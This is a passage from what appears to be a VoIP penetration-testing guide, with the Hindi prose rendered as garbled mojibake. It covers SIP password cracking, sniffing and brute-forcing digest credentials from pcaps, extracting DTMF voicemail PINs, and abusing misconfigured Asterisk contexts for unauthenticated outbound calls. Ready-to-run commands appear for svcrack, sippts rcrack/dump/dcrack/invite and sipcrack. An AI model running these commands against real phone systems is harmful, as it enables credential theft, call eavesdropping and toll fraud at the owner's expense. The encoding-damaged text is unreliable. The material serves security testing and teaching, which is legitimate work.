* **`svcrack`** SIPVicious рд╕реЗ (`sudo apt install sipvicious`): SVCrack рдЖрдкрдХреЛ PBX рдкрд░ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо/рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack рдПрдХ рд░рд┐рдореЛрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдХреНрд░реИрдХрд░ рд╣реИ рдЬреЛ SIP рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╣реИред Rcrack рдХрд┐рд╕реА рднреА рд╡рд┐рднрд┐рдиреНрди рдпреВрдЬрд░реНрд╕ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдЯреЗрд╕реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╡рд┐рднрд┐рдиреНрди IPs рдФрд░ рдкреЛрд░реНрдЯ рд░реЗрдВрдЬ рдореЗрдВ рд╣реИрдВред
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
### VoIP рд╕реНрдирд┐рдлрд┐рдВрдЧ

рдпрджрд┐ рдЖрдкрдХреЛ **рдУрдкрди рд╡рд╛рдИ-рдлрд╛рдИ рдиреЗрдЯрд╡рд░реНрдХ** рдХреЗ рдЕрдВрджрд░ VoIP рдЙрдкрдХрд░рдг рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рдЖрдк **рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╕реНрдирд┐рдл рдХрд░ рд╕рдХрддреЗ** рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдЕрдзрд┐рдХ рдмрдВрдж рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ (рдЗрдерд░рдиреЗрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рд╡рд╛рдИ-рдлрд╛рдИ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рддреЛ рдЖрдк **ARPspoofing** рдЬреИрд╕реЗ **MitM рд╣рдорд▓реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) рдХреЗ рдмреАрдЪ **PBX рдФрд░ рдЧреЗрдЯрд╡реЗ** рдХреЗ рдмреАрдЪ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╕реНрдирд┐рдл рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

рдиреЗрдЯрд╡рд░реНрдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рдмреАрдЪ, рдЖрдк **рд╡реЗрдм рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕**, **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо**, **IP** рдкрддреЗ, рдпрд╣рд╛рдБ рддрдХ рдХрд┐ **рд╣реИрд╢ рдЧреБрдкреНрддрд╢рдмреНрдж** рдФрд░ **RTP рдкреИрдХреЗрдЯреНрд╕** рднреА рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк **рдмрд╛рддрдЪреАрдд рд╕реБрдирдиреЗ** рдХреЗ рд▓рд┐рдП рдкреБрди: рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЕрдзрд┐рдХред

рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк Wireshark, tcpdump рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ... рд▓реЗрдХрд┐рди **VoIP рдмрд╛рддрдЪреАрддреЛрдВ рдХреЛ рд╕реНрдирд┐рдл рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдЙрдкрдХрд░рдг рд╣реИ** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ **SIP рд╕рдВрдЪрд╛рд░ рдореЗрдВ TLS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рддреЛ рдЖрдк рд╕рд╛рдл рдореЗрдВ SIP рд╕рдВрдЪрд╛рд░ рдХреЛ рдирд╣реАрдВ рджреЗрдЦ рдкрд╛рдПрдВрдЧреЗред\
рдпрджрд┐ **SRTP** рдФрд░ **ZRTP** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **RTP рдкреИрдХреЗрдЯреНрд╕ рд╕рд╛рдл рдкрд╛рда рдореЗрдВ рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ**ред
{% endhint %}

#### SIP рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ (рдкрд╛рд╕рд╡рд░реНрдб рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ - рдСрдлрд▓рд╛рдЗрди)

[рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЖрдк рдПрдХ **SIP REGISTER рд╕рдВрдЪрд╛рд░** рдХреЛ рдмреЗрд╣рддрд░ рд╕рдордЭ рд╕рдХреЗрдВ](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) рддрд╛рдХрд┐ рдЖрдк рд╕рдордЭ рд╕рдХреЗрдВ рдХрд┐ **рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреИрд╕реЗ рднреЗрдЬреА рдЬрд╛ рд░рд╣реА рд╣реИрдВ**ред

* **`sipdump`** рдФрд░ **`sipcrack`,** **sipcrack** рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ (`apt-get install sipcrack`): рдпреЗ рдЙрдкрдХрд░рдг SIP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рднреАрддрд░ рд╕реЗ **рдбрд╛рдЗрдЬреЗрд╕реНрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЛ **рдкреАрдХреИрдк** рд╕реЗ **рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЙрдиреНрд╣реЗрдВ **рдмреНрд░реВрдЯрдлреЛрд░реНрд╕** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS рдбрдВрдк`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS рдбрдВрдк pcap рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдбрд╛рдЗрдЬреЗрд╕реНрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдирд┐рдХрд╛рд▓ рд╕рдХрддрд╛ рд╣реИред
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ SIPPTS рдбрдВрдк рдХреЗ рд╕рд╛рде рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЧрдП рдбрд╛рдЗрдЬреЗрд╕реНрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** рдХреЛ [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark рдПрдХ PCAP рдлрд╝рд╛рдЗрд▓ рд╕реЗ SIP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдбреЗрдЯрд╛ рдХреЛ рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИред
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF рдХреЛрдб

**рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд┐рдХ рдореЗрдВ** SIP рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рдЕрд▓рд╛рд╡рд╛, DTMF рдХреЛрдб рднреА рдкрд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **рд╡реЙрдпрд╕рдореЗрд▓** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред\
рдпреЗ рдХреЛрдб **INFO SIP messages** рдореЗрдВ, **рдСрдбрд┐рдпреЛ** рдореЗрдВ рдпрд╛ **RTP packets** рдХреЗ рдЕрдВрджрд░ рднреЗрдЬрдирд╛ рд╕рдВрднрд╡ рд╣реИред рдЕрдЧрд░ рдХреЛрдб RTP packets рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ, рддреЛ рдЖрдк рдЙрд╕ рдмрд╛рддрдЪреАрдд рдХрд╛ рд╡рд╣ рд╣рд┐рд╕реНрд╕рд╛ рдХрд╛рдЯ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреВрд▓ multimo рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
multimon -a DTMF -t wac pin.wav
```
### рдореБрдлреНрдд рдХреЙрд▓реНрд╕ / рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдХрдиреЗрдХреНрд╢рди рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди

рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдореЗрдВ рдПрдХ рдХрдиреЗрдХреНрд╢рди рдХреЛ **рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЖрдИрдкреА рдкрддреЗ** рд╕реЗ рдпрд╛ **рдХрд┐рд╕реА рднреА рдЖрдИрдкреА рдкрддреЗ** рд╕реЗ рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```
host=10.10.10.10
host=dynamic
```
рдпрджрд┐ рдПрдХ рдЖрдИрдкреА рдкрддрд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ **рд╣реЛрд╕реНрдЯ рдХреЛ рд╣рд░ рдЬрдм-рдЬрдм рдЬрд░реВрд░рдд рд╣реЛрдЧреА рддреЛ REGISTER** рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрдЧреА (REGISTER рдкреИрдХреЗрдЯ рдореЗрдВ рд╕рдордп рддрдХ рдЬреАрд╡рд┐рддрд┐ рднреЗрдЬреА рдЬрд╛рддреА рд╣реИ, рд╕рд╛рдорд╛рдиреНрдпрдд: 30 рдорд┐рдирдЯ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рджреВрд╕рд░реЗ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдлреЛрди рдХреЛ рд╣рд░ 30 рдорд┐рдирдЯ рдореЗрдВ REGISTER рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА)ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЙрд╕реЗ рдХреЙрд▓ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реЗ рдЦреБрд▓реЗ рдкреЛрд░реНрдЯ рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдП рдЬреЛ рд╡реЙрдпрдк рд╕рд░реНрд╡рд░ рд╕реЗ рдХреЙрд▓ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░реВрдк рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

* **`type=user`**: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗрд╡рд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрд▓ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* **`type=friend`**: рдкреАрдпрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрд▓ рдХрд░рдиреЗ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрд▓ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ (рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ)
* **`type=peer`**: рдкреАрдпрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрд▓ рднреЗрдЬрдиреЗ рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ (SIP-рдЯреНрд░рдВрдХ)

рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдЪрд░ рдХреЗ рд╕рд╛рде рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ:

* **`insecure=port`**: рдЖрдИрдкреА рджреНрд╡рд╛рд░рд╛ рд╕рддреНрдпрд╛рдкрд┐рдд рдкреАрдпрд░ рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
* **`insecure=invite`**: INVITE рд╕рдВрджреЗрд╢реЛрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ
* **`insecure=port,invite`**: рджреЛрдиреЛрдВ

{% hint style="warning" %}
рдЬрдм **`type=friend`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **рд╣реЛрд╕реНрдЯ** рдЪрд░ рдХреА **рдорд╛рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ **рдЙрд╕ рдорд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ SIP-рдЯреНрд░рдВрдХ рдХреЛ рдЧрд▓рддреА рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИ**, рддреЛ **рдХреЛрдИ рднреА рдЙрд╕рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛ рд╕рдХреЗрдЧрд╛**ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрд╣ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реЛрдЧреА:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### рдореБрдлреНрдд рдХреЙрд▓ / рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдХрдВрдЯреЗрдХреНрд╕реНрдЯ рдЧрд▓рддрд┐рдпрд╛рдБ

рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдореЗрдВ рдПрдХ **рдХрдВрдЯреЗрдХреНрд╕реНрдЯ** рдПрдХ рдирд╛рдорд┐рдд рдХрдВрдЯреЗрдирд░ рдпрд╛ рдЦрдВрдб рд╣реИ рдЬреЛ рдбрд╛рдпрд▓ рдкреНрд▓рд╛рди рдореЗрдВ рд╕рдВрдмрдВрдзрд┐рдд рдПрдХреНрд╕рдЯреЗрдВрд╢рди, рдХреНрд░рд┐рдпрд╛рдПрдБ, рдФрд░ рдирд┐рдпрдореЛрдВ рдХреЛ **рд╕рдореВрд╣рд┐рдд рдХрд░рддрд╛ рд╣реИ**ред рдбрд╛рдпрд▓ рдкреНрд▓рд╛рди рдПрдХ рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рдореВрд▓ рдШрдЯрдХ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ **рдпрд╣ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЖрдЙрдЯрдЧреЛрдЗрдВрдЧ рдХреЙрд▓реНрд╕ рдХреИрд╕реЗ рд╣реИрдВрдбрд▓ рдФрд░ рд░реВрдЯ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ**ред рдХрдВрдЯреЗрдХреНрд╕реНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдбрд╛рдпрд▓ рдкреНрд▓рд╛рди рдХреЛ рд╕рдВрдЧрдард┐рдд рдХрд░рдиреЗ, рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ, рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╡рд┐рднрд┐рдиреНрди рд╣рд┐рд╕реНрд╕реЛрдВ рдХреЗ рдмреАрдЪ рд╡рд┐рднрд╛рдЬрди рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдкреНрд░рддреНрдпреЗрдХ рдХрдВрдЯреЗрдХреНрд╕реНрдЯ рдХреЛ рд╕рд╛рдорд╛рдиреНрдпрдд: **`extensions.conf`** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдХрдВрдЯреЗрдХреНрд╕реНрдЯ рдХреЛ рд╡рд░реНрдЧрд╛рдХрд╛рд░ рдмреНрд░реИрдХреЗрдЯреНрд╕ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдХрдВрдЯреЗрдХреНрд╕реНрдЯ рдХрд╛ рдирд╛рдо рдЙрдиреНрд╣реЗрдВ рдШреЗрд░реЗ рд╣реБрдП рд╣реЛрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```bash
csharpCopy code[my_context]
```
рдЗрд╕ рд╕рдВрджрд░реНрдн рдореЗрдВ, рдЖрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ (рдбрд╛рдпрд▓ рдХрд┐рдП рдЧрдП рдирдВрдмрд░реНрд╕ рдХреЗ рдкреИрдЯрд░реНрди) рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдХреБрдЫ рдХреНрд░рд┐рдпрд╛рдПрдБ рдпрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рд╕реЗ рдЬреЛрдбрд╝рддреЗ рд╣реИрдВред рдпреЗ рдХреНрд░рд┐рдпрд╛рдПрдБ рддрдп рдХрд░рддреА рд╣реИрдВ рдХрд┐ рдХреЙрд▓ рдХреЛ рдХреИрд╕реЗ рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рдПред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
рдпрд╣ рдЙрджрд╛рд╣рд░рдг рдПрдХ рд╕рд░рд▓ рд╕рдВрджрд░реНрдн рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ "my\_context" рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдПрдХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди "100" рд╣реИред рдЬрдм рдХреЛрдИ 100 рдбрд╛рдпрд▓ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдХреЙрд▓ рдЙрддреНрддрд░рд┐рдд рдХреА рдЬрд╛рдПрдЧреА, рдПрдХ рд╕реНрд╡рд╛рдЧрдд рд╕рдВрджреЗрд╢ рдкреНрд▓реЗ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдФрд░ рдлрд┐рд░ рдХреЙрд▓ рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдпрд╣ **рдПрдХ рдФрд░ рд╕рдВрджрд░реНрдн** рд╣реИ рдЬреЛ **рдХрд┐рд╕реА рднреА рдЕрдиреНрдп рдирдВрдмрд░ рдкрд░ рдХреЙрд▓ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
рдпрджрд┐ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрджрд░реНрдн** рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
рдХрд┐рд╕реА рднреА рд╡реНрдпрдХреНрддрд┐ рдХреЛ **рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рд╕реА рднреА рдЕрдиреНрдп рдирдВрдмрд░ рдкрд░ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдЧреА (рдФрд░ рд╕рд░реНрд╡рд░ рдХрд╛ рдкреНрд░рд╢рд╛рд╕рдХ рдХреЙрд▓ рдХреЗ рд▓рд┐рдП рднреБрдЧрддрд╛рди рдХрд░реЗрдЧрд╛)ред
{% endhint %}

{% hint style="danger" %}
рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **`sip.conf`** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **`allowguest=true`** рд╢рд╛рдорд┐рд▓ рд╣реИ, рддреЛ **рдХреЛрдИ рднреА** рд╣рдорд▓рд╛рд╡рд░ **рдХрд┐рд╕реА рднреА рдЕрдиреНрдп рдирдВрдмрд░ рдкрд░ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдХрд┐рд╕реА рднреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд┐рдирд╛ рд╕рдХреНрд╖рдо рд╣реЛ рдЬрд╛рдПрдЧрд╛ред
{% endhint %}

*   **`SIPPTS invite`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite checks if a **PBX server allows us to make calls without authentication**. If the SIP server has an incorrect configuration, it will allow us to make calls to external numbers. It can also allow us to transfer the call to a second external number.

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдХреЗ Asterisk рд╕рд░реНрд╡рд░ рдореЗрдВ рдПрдХ рдмреБрд░реА рд╕рдВрджрд░реНрдн рд╡рд┐рдиреНрдпрд╛рд╕ рд╣реИ, рддреЛ рдЖрдк INVITE рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд┐рдирд╛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдирд╣реАрдВ рдЬрд╛рдирддреЗ рд╣реБрдП рдХреЙрд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### рдореБрдлреНрдд рдХреЙрд▓ / рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ IVRS

IVRS рдХрд╛ рдорддрд▓рдм рд╣реИ **рдЗрдВрдЯрд░реЗрдХреНрдЯрд┐рд╡ рд╡реЙрдпрд╕ рд░рд┐рд╕реНрдкреЙрдиреНрд╕ рд╕рд┐рд╕реНрдЯрдо**, рдПрдХ рджреВрд░рд╕рдВрдЪрд╛рд░ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЖрд╡рд╛рдЬ рдпрд╛ рдЯрдЪ-рдЯреЛрди рдЗрдирдкреБрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдВрдкреНрдпреВрдЯрд░реАрдХреГрдд рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред IVRS рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХреЙрд▓ рд╣реИрдВрдбрд▓рд┐рдВрдЧ** рд╕рд┐рд╕реНрдЯрдо рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХрд░рдирд╛, рдХреЙрд▓ рд░реВрдЯрд┐рдВрдЧ, рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдЬреИрд╕реА рд╡рд┐рднрд┐рдиреНрди 